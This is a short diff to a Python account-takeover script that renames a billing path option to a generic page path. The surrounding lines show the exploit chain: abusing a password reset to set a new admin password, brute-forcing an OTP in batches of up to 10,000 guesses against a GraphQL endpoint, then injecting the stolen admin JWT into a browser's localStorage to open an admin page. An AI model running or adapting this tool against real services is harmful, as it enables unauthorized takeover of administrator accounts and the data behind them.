@@ -70,9 +70,9 @@ def brute_force_otp(graphql_url, session, batch_size, interval, total=10000):
     raise RuntimeError("OTP brute-force failed")
 
 
-def open_admin(graphql_url, jwt, billing_path='/billing'):
+def open_admin(graphql_url, jwt, page_path=''):
     print(f"Admin JWT: {jwt}")
-    url = urljoin(graphql_url.rsplit('/', 1)[0], billing_path)
+    url = urljoin(graphql_url.rsplit('/', 1)[0], page_path)
     html = f"""
 <html><body><script>
   localStorage.setItem('token','{jwt}');
@@ -91,7 +91,7 @@ def main():
     parser.add_argument('--password', default='P@ssw0rd123!', help='New admin password')
     parser.add_argument('--batch-size', type=int, default=500, help='OTP batch size')
     parser.add_argument('--interval', type=int, default=2, help='Seconds between batches')
-    parser.add_argument('--billing', default='/billing', help='Directory/Page URL path')
+    parser.add_argument('--page', default='', help='Directory/Page URL path')
     args = parser.parse_args()
 
     token = get_reset_token(args.url, args.email)
@@ -100,7 +100,7 @@ def main():
     session = start_login(args.url, args.email, args.password)
     time.sleep(1)
     jwt = brute_force_otp(args.url, session, args.batch_size, args.interval)
-    open_admin(args.url, jwt, args.billing)
+    open_admin(args.url, jwt, args.page)
 
 if __name__ == '__main__':
     main()
